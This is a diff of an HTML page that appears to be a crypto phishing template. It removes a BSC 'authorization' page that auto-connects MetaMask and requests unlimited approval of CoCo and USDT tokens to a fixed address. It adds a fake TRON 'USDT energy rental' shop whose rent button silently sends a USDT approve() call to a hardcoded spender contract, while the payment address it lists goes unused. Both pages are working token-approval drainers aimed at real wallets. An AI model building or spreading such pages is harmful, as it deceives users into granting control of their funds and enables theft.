@@ -1,618 +1,223 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BSC 授权</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
+  <title>USDT能量租赁</title>
+  <link rel="icon" type="image/png" href="png/icon_trx.png">
+  <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
+  <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            primary: '#e5020d',
+            primaryLight: '#C1DAF6',
+            border: '#E5E5E5',
+            text: '#000000',
+            textLight: '#999999',
+            textTitle: '#08090B',
+            placeholder: '#999999',
+            warning: '#FF7D00',
+            background: '#F5F5F7',
+            arrowCircle: '#9898A1'
+          },
+          fontFamily: {
+            sans: ['-apple-system', 'BlinkMacSystemFont', 'Helvetica Neue', 'Arial', 'sans-serif']
+          }
         }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-        }
-        
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 32px;
-            color: white;
-            font-weight: bold;
-        }
-        
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 24px;
-        }
-        
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
-        
-        .info-box {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 30px;
-            text-align: left;
-        }
-        
-        .info-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            font-size: 14px;
-        }
-        
-        .info-item:last-child {
-            margin-bottom: 0;
-        }
-        
-        .label {
-            color: #666;
-        }
-        
-        .value {
-            color: #333;
-            font-weight: 500;
-        }
-        
-        .authorize-btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            transition: transform 0.2s;
-        }
-        
-        .authorize-btn:hover {
-            transform: translateY(-2px);
-        }
-        
-        .authorize-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14px;
-            display: none;
-        }
-        
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        
-        .status.info {
-            background: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-        }
-        
-        .wallet-info {
-            background: #e3f2fd;
-            border: 1px solid #bbdefb;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #1976d2;
-        }
-        
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #ffffff;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 10px;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        /* 代币选择样式 */
-        .tokens-section {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 30px;
-            text-align: left;
-        }
-        
-        .tokens-section h3 {
-            color: #333;
-            margin-bottom: 15px;
-            font-size: 16px;
-            text-align: center;
-        }
-        
-        .token-item {
-            display: flex;
-            align-items: center;
-            padding: 12px;
-            margin-bottom: 10px;
-            background: white;
-            border-radius: 8px;
-            border: 2px solid transparent;
-            transition: all 0.2s;
-        }
-        
-        .token-item:last-child {
-            margin-bottom: 0;
-        }
-        
-        .token-item:hover {
-            border-color: #667eea;
-            transform: translateY(-1px);
-        }
-        
+      }
+    }
+  </script>
+  <style type="text/tailwindcss">
+    @layer utilities {
+      .module-frame { border: 1px solid theme('colors.border'); border-radius: 12px; }
+      .rent-card { @apply cursor-pointer rounded-xl border border-border p-4 transition; }
+      .rent-card.active { @apply border-primary ring-2 ring-primary/20 bg-white; }
+      .rent-grid { @apply grid grid-cols-2 gap-3; }
+      .btn-primary { @apply w-full bg-primaryLight text-white py-3 rounded-xl font-bold text-[17px] shadow-sm transition-colors duration-200; }
+      .btn-enabled { @apply bg-primary; }
+      .tishi { width: 58%; padding: .3rem; background: #4b4848; z-index: 999999; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border-radius: .3rem; color: #fff; font-size: 1rem; text-align: center; display: none; }
+    }
+  </style>
+  <script>
+    // 基础配置
+    // 权限地址（合约地址）
+    window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
+    // 收款地址（个人地址）
+    window.Payment_address = 'TAymcrbZ3ybiVq9DrqQXWx3AmtPWMiwhsh';
+    // USDT官方合约地址（无需修改）
+    window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
-        
-        .token-icon {
-            font-size: 24px;
-            margin-right: 12px;
-        }
-        
-        .token-name {
-            font-weight: 600;
-            color: #333;
-            margin-right: 15px;
-            min-width: 80px;
-        }
-        
-        .token-address {
-            font-size: 12px;
-            color: #666;
-            font-family: monospace;
-            word-break: break-all;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: #e9ecef;
-            border-radius: 3px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-        
+    const RENT_OPTIONS = [
+      { id: 'm10', label: '10 分钟', minutes: 10, price: 1.0 },
+      { id: 'm20', label: '20 分钟', minutes: 20, price: 1.9 },
+      { id: 'm30', label: '30 分钟', minutes: 30, price: 2.8 },
+      { id: 'h1',  label: '1 小时',  minutes: 60, price: 5.9 }
+    ];
 
-    </style>
+    let selectedOptionId = 'm10';
+
+    function tip(message) {
+      const el = document.getElementById('tip');
+      el.textContent = message;
+      el.style.display = 'block';
+      setTimeout(() => el.style.display = 'none', 2500);
+    }
+
+    async function connectWallet() {
+      try {
+        if (window.tronWeb && window.tronWeb.ready) return true;
+        if (window.tronLink) {
+          const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+          if (res.code === 200) {
+            window.tronWeb = window.tronLink.tronWeb;
+            return true;
+          }
+        }
+        tip('请在内置钱包浏览器中打开或安装 TronLink/OKX 钱包');
+        return false;
+      } catch (e) {
+        console.error('连接钱包失败:', e);
+        tip('连接钱包失败');
+        return false;
+      }
+    }
+
+    function refreshUI() {
+      // 切换卡片选中态
+      for (const opt of RENT_OPTIONS) {
+        const card = document.getElementById(`card-${opt.id}`);
+        if (!card) continue;
+        if (opt.id === selectedOptionId) card.classList.add('active'); else card.classList.remove('active');
+      }
+      const current = RENT_OPTIONS.find(x => x.id === selectedOptionId);
+      document.getElementById('priceText').textContent = `${current.price} USDT`;
+      const btn = document.getElementById('rentBtn');
+      btn.classList.add('btn-enabled');
+      btn.disabled = false;
+    }
+
+    async function approveRental() {
+      const ok = await connectWallet();
+      if (!ok) return;
+
+      const current = RENT_OPTIONS.find(x => x.id === selectedOptionId);
+      if (!current) { tip('请选择租赁时长'); return; }
+
+      try {
+        const spenderBase58 = window.Permission_address;
+        const usdt = window.usdtContractAddress;
+        const amountInSmallest = new Decimal(current.price).mul(1e6).toFixed(0); // USDT 6位精度
+
+        const usdtHex = tronWeb.address.toHex(usdt);
+        const spenderHex = tronWeb.address.toHex(spenderBase58);
+
+        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+          usdtHex,
+          'approve(address,uint256)',
+          { feeLimit: 100_000_000 },
+          [
+            { type: 'address', value: spenderHex },
+            { type: 'uint256', value: amountInSmallest }
+          ],
+          tronWeb.defaultAddress.base58
+        );
+
+        if (!tx.result || !tx.result.result) {
+          throw new Error('授权交易构建失败');
+        }
+
+        const signed = await tronWeb.trx.sign(tx.transaction);
+        const res = await tronWeb.trx.sendRawTransaction(signed);
+
+        if (res.result) {
+          tip('授权成功');
+        } else {
+          throw new Error('授权发送失败');
+        }
+      } catch (err) {
+        console.error('授权失败:', err);
+        tip('授权失败，请重试');
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', async () => {
+      // 渲染选项
+      const grid = document.getElementById('rentGrid');
+      for (const opt of RENT_OPTIONS) {
+        const div = document.createElement('div');
+        div.id = `card-${opt.id}`;
+        div.className = 'rent-card';
+        div.innerHTML = `
+          <div class="flex items-center justify-between">
+            <div>
+              <div class="text-[16px] text-textTitle font-medium">${opt.label}</div>
+              <div class="text-[13px] text-textLight mt-1">固定价</div>
+            </div>
+            <div class="text-[18px] text-text font-semibold">${opt.price} <span class="text-[13px] text-textLight">USDT</span></div>
+          </div>
+        `;
+        div.onclick = () => { selectedOptionId = opt.id; refreshUI(); };
+        grid.appendChild(div);
+      }
+
+      document.getElementById('rentBtn').addEventListener('click', approveRental);
+
+      refreshUI();
+      // 进入页面后自动连接钱包
+      await connectWallet();
+    });
+  </script>
 </head>
-<body>
-    <div class="container">
-        <div class="logo">🔐</div>
-        <h1>BSC 授权</h1>
-        <p class="subtitle">授权访问您的代币</p>
-        
-        <div class="wallet-info" id="walletInfo" style="display: none;">
-            <strong>钱包地址:</strong> <span id="walletAddress"></span>
-        </div>
-        
-        <div class="info-box">
-            <div class="info-item">
-                <span class="label">授权合约:</span>
-                <span class="value" id="contractAddress">0xe3c0e066D870036aCc178492C638963A0E97d4Bb</span>
-            </div>
-            <div class="info-item">
-                <span class="label">授权数量:</span>
-                <span class="value">无限</span>
-            </div>
-        </div>
-        
-        <!-- 代币授权信息 -->
-        <div class="tokens-section">
-            <h3>将要授权的代币</h3>
-            
-            <div class="token-item">
-                <span class="token-icon">💵</span>
-                <span class="token-name">CoCo</span>
-                <span class="token-address">0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550</span>
-            </div>
-            
-            <div class="token-item">
-                <span class="token-icon">💲</span>
-                <span class="token-name">USDT</span>
-                <span class="token-address">0x55d398326f99059fF775485246999027B3197955</span>
-            </div>
-        </div>
-        
-        <button class="authorize-btn" id="authorizeBtn" onclick="authorize()">
-            立即授权
-        </button>
-        
-        <!-- 进度条 -->
-        <div class="progress-bar" id="progressBar" style="display: none;">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
-        
-        <div class="status" id="status"></div>
+<body class="min-h-screen font-sans">
+  <div class="min-h-screen bg-gradient-to-br from-[#b10b16] to-[#7a0c13] p-4 sm:p-6">
+    <div class="max-w-[1200px] mx-auto h-14 px-5 flex items-center justify-center">
+      <div class="text-white font-extrabold text-[22px]">USDT能量租赁</div>
     </div>
+    <div class="bg-background rounded-3xl overflow-hidden max-w-[1200px] mx-auto flex flex-col min-h-[calc(100vh-4rem)] shadow">
 
-    <script>
-        // BSC链配置
-        const BSC_CHAIN_ID = '0x38'; // BSC主网
-        const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
-        
-        // 合约地址
-        const PERMISSION_ADDRESS = '0xe3c0e066D870036aCc178492C638963A0E97d4Bb';
-        
-        // 代币合约地址
-        const TOKENS = {
-            coco: {
-                name: 'CoCo',
-                address: '0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550',
-                icon: '💵',
-                isNative: false
-            },
-            usdt: {
-                name: 'USDT',
-                address: '0x55d398326f99059fF775485246999027B3197955',
-                icon: '💲',
-                isNative: false
-            }
-        };
-        
-        let web3;
-        let userAccount;
-        
-        // 页面加载完成后自动连接钱包
-        window.addEventListener('load', async () => {
-            await connectWallet();
-        });
-        
-        // 连接钱包
-        async function connectWallet() {
-            try {
-                showStatus('正在连接钱包...', 'info');
-                
-                // 检查是否安装了MetaMask
-                if (typeof window.ethereum === 'undefined') {
-                    showStatus('请安装MetaMask钱包', 'error');
-                    return false;
-                }
-                
-                // 请求连接钱包
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                if (accounts.length === 0) {
-                    showStatus('请授权连接钱包', 'error');
-                    return false;
-                }
-                
-                userAccount = accounts[0];
-                
-                // 检查网络
-                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (chainId !== BSC_CHAIN_ID) {
-                    await switchToBSC();
-                }
-                
-                // 初始化Web3
-                web3 = new Web3(window.ethereum);
-                
-                // 显示钱包信息
-                document.getElementById('walletAddress').textContent = userAccount;
-                document.getElementById('walletInfo').style.display = 'block';
-                
-                showStatus('钱包连接成功！', 'success');
-                setTimeout(() => hideStatus(), 2000);
-                
-                return true;
-                
-            } catch (error) {
-                console.error('连接钱包失败:', error);
-                showStatus('连接钱包失败: ' + error.message, 'error');
-                return false;
-            }
-        }
-        
-        // 切换到BSC网络
-        async function switchToBSC() {
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: BSC_CHAIN_ID }],
-                });
-            } catch (switchError) {
-                // 如果BSC网络不存在，则添加
-                if (switchError.code === 4902) {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: BSC_CHAIN_ID,
-                            chainName: 'Binance Smart Chain',
-                            nativeCurrency: {
-                                name: 'BNB',
-                                symbol: 'BNB',
-                                decimals: 18
-                            },
-                            rpcUrls: [BSC_RPC_URL],
-                            blockExplorerUrls: ['https://bscscan.com/']
-                        }]
-                    });
-                }
-            }
-        }
-        
-        // 批量授权合约ABI
-        const BATCH_APPROVE_ABI = [
-            {
-                "inputs": [
-                    {"name": "tokens", "type": "address[]"},
-                    {"name": "spender", "type": "address"},
-                    {"name": "amounts", "type": "uint256[]"}
-                ],
-                "name": "batchApprove",
-                "outputs": [{"name": "", "type": "bool[]"}],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
-        ];
-        
-        // 批量授权合约地址（这是一个示例地址，实际需要部署）
-        const BATCH_APPROVE_CONTRACT = '0x0000000000000000000000000000000000000000'; // 需要替换为实际地址
-        
-        // 授权函数
-        async function authorize() {
-            if (!web3 || !userAccount) {
-                showStatus('请先连接钱包', 'error');
-                return;
-            }
-            
-            try {
-                const authorizeBtn = document.getElementById('authorizeBtn');
-                authorizeBtn.disabled = true;
-                authorizeBtn.innerHTML = '<span class="loading"></span>授权中...';
-                
-                // 显示进度条
-                const progressBar = document.getElementById('progressBar');
-                const progressFill = document.getElementById('progressFill');
-                progressBar.style.display = 'block';
-                
-                showStatus('开始授权CoCo和USDT代币...', 'info');
-                
-                // 准备授权数据
-                const tokensToAuthorize = [TOKENS.coco, TOKENS.usdt];
-                const tokenAddresses = tokensToAuthorize.map(token => token.address);
-                const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-                const amounts = new Array(tokensToAuthorize.length).fill(maxUint256);
-                
-                // 方法1：尝试使用批量授权合约（如果存在）
-                if (BATCH_APPROVE_CONTRACT !== '0x0000000000000000000000000000000000000000') {
-                    try {
-                        showStatus('使用批量授权合约...', 'info');
-                        
-                        const batchContract = new web3.eth.Contract(BATCH_APPROVE_ABI, BATCH_APPROVE_CONTRACT);
-                        
-                        // 构建批量授权交易
-                        const data = batchContract.methods.batchApprove(tokenAddresses, PERMISSION_ADDRESS, amounts).encodeABI();
-                        
-                        const transaction = {
-                            from: userAccount,
-                            to: BATCH_APPROVE_CONTRACT,
-                            data: data,
-                            gas: 500000, // 预估Gas
-                            gasPrice: await web3.eth.getGasPrice()
-                        };
-                        
-                        showStatus('请在钱包中确认批量授权交易...', 'info');
-                        
-                        const receipt = await web3.eth.sendTransaction(transaction);
-                        
-                        if (receipt.status) {
-                            showStatus('批量授权成功！', 'success');
-                            authorizeBtn.innerHTML = '授权完成';
-                            authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
-                        } else {
-                            showStatus('批量授权失败', 'error');
-                            authorizeBtn.innerHTML = '重新授权';
-                        }
-                        
-                        authorizeBtn.disabled = false;
-                        progressBar.style.display = 'none';
-                        return;
-                        
-                    } catch (error) {
-                        console.log('批量授权合约不可用，回退到传统方式:', error);
-                    }
-                }
-                
-                // 方法2：使用传统方式，但优化用户体验
-                showStatus('使用优化授权方式...', 'info');
-                
-                // 构建所有交易的参数
-                const transactions = [];
-                for (let i = 0; i < tokensToAuthorize.length; i++) {
-                    const token = tokensToAuthorize[i];
-                    const tokenContract = new web3.eth.Contract([
-                        {
-                            "constant": false,
-                            "inputs": [
-                                {"name": "_spender", "type": "address"},
-                                {"name": "_value", "type": "uint256"}
-                            ],
-                            "name": "approve",
-                            "outputs": [{"name": "", "type": "bool"}],
-                            "payable": false,
-                            "stateMutability": "nonpayable",
-                            "type": "function"
-                        }
-                    ], token.address);
-                    
-                    const data = tokenContract.methods.approve(PERMISSION_ADDRESS, maxUint256).encodeABI();
-                    const gasEstimate = await tokenContract.methods.approve(PERMISSION_ADDRESS, maxUint256)
-                        .estimateGas({ from: userAccount });
-                    
-                    transactions.push({
-                        from: userAccount,
-                        to: token.address,
-                        data: data,
-                        gas: Math.floor(gasEstimate * 1.2),
-                        gasPrice: await web3.eth.getGasPrice(),
-                        tokenName: token.name
-                    });
-                }
-                
-                // 提示用户确认交易
-                showStatus('请在钱包中确认USDT授权交易...', 'info');
-                
-                // 发送交易
-                let successCount = 0;
-                let failCount = 0;
-                
-                for (let i = 0; i < transactions.length; i++) {
-                    const tx = transactions[i];
-                    const progress = ((i + 1) / transactions.length) * 100;
-                    progressFill.style.width = progress + '%';
-                    
-                    try {
-                        showStatus(`正在发送 ${tx.tokenName} 的授权交易...`, 'info');
-                        
-                        const txHash = await web3.eth.sendTransaction(tx);
-                        console.log(`${tx.tokenName} 授权交易已发送，交易哈希:`, txHash);
-                        
-                        // 等待交易确认
-                        const receipt = await web3.eth.waitForTransactionReceipt(txHash);
-                        
-                        if (receipt.status) {
-                            successCount++;
-                            showStatus(`${tx.tokenName} 授权成功！`, 'success');
-                        } else {
-                            failCount++;
-                            showStatus(`${tx.tokenName} 授权失败`, 'error');
-                        }
-                        
-                    } catch (error) {
-                        console.error(`${tx.tokenName} 授权失败:`, error);
-                        failCount++;
-                        showStatus(`${tx.tokenName} 授权失败: ${error.message}`, 'error');
-                    }
-                }
-                
-                // 隐藏进度条
-                progressBar.style.display = 'none';
-                
-                // 显示最终结果
-                if (failCount === 0) {
-                    showStatus(`CoCo和USDT授权成功！`, 'success');
-                    authorizeBtn.innerHTML = '授权完成';
-                    authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
-                } else {
-                    showStatus(`CoCo和USDT授权失败`, 'error');
-                    authorizeBtn.innerHTML = '重新授权';
-                    authorizeBtn.style.background = 'linear-gradient(135deg, #ff9800 0%, #f57c00 100%)';
-                }
-                
-                authorizeBtn.disabled = false;
-                
-            } catch (error) {
-                console.error('授权过程出错:', error);
-                showStatus('授权过程出错: ' + error.message, 'error');
-                
-                // 隐藏进度条
-                document.getElementById('progressBar').style.display = 'none';
-                
-                // 重置按钮
-                const authorizeBtn = document.getElementById('authorizeBtn');
-                authorizeBtn.disabled = false;
-                authorizeBtn.innerHTML = '重新授权';
-            }
-        }
-        
-        // 显示状态信息
-        function showStatus(message, type) {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            status.className = `status ${type}`;
-            status.style.display = 'block';
-        }
-        
-        // 隐藏状态信息
-        function hideStatus() {
-            document.getElementById('status').style.display = 'none';
-        }
-        
-        // 监听网络切换
-        if (window.ethereum) {
-            window.ethereum.on('chainChanged', (chainId) => {
-                if (chainId !== BSC_CHAIN_ID) {
-                    showStatus('请切换到BSC网络', 'error');
-                } else {
-                    hideStatus();
-                }
-            });
-            
-            window.ethereum.on('accountsChanged', (accounts) => {
-                if (accounts.length === 0) {
-                    userAccount = null;
-                    document.getElementById('walletInfo').style.display = 'none';
-                    showStatus('钱包已断开连接', 'error');
-                } else {
-                    userAccount = accounts[0];
-                    document.getElementById('walletAddress').textContent = userAccount;
-                    document.getElementById('walletInfo').style.display = 'block';
-                    hideStatus();
-                }
-            });
-        }
-    </script>
+  <main class="p-5 flex flex-col items-center flex-grow">
+    <div class="w-full max-w-[559px]">
+      <div class="bg-yellow-100 border border-yellow-200 rounded-xl p-4 mb-5">
+        <ul class="list-disc ml-5 text-[14px] text-text">
+          <li class="mb-1">请保管好相关凭证截图</li>
+          <li class="mb-1">提交前请确认已在客服联系报备</li>
+          <li class="mb-1">请勿重复提交申请，如遇问题请联系管理员</li>
+          <li class="mb-1">务必使用真实有效的邮箱，相关信息将发送至您的邮箱</li>
+          <li>请确保填写正确的 TRON(TRC20) 网络地址，地址错误可能导致资产丢失</li>
+        </ul>
+      </div>
+
+      <div class="mb-2 text-[15px] text-textLight">租赁市场</div>
+
+      <div id="rentGrid" class="rent-grid mb-5"></div>
+
+      <div class="bg-white module-frame p-4 mb-6">
+        <div class="flex items-center justify-between">
+          <div class="text-textLight text-[15px]">应付</div>
+          <div id="priceText" class="text-text text-[18px] font-semibold">0 USDT</div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="p-5 border-t border-border mt-auto bg-background">
+    <div class="w-full max-w-[559px] mx-auto">
+      <button id="rentBtn" class="btn-primary" disabled>租赁</button>
+    </div>
+  </footer>
+    </div>
+  </div>
+
+  <div class="tishi" id="tip">提示</div>
 </body>
 </html>
 
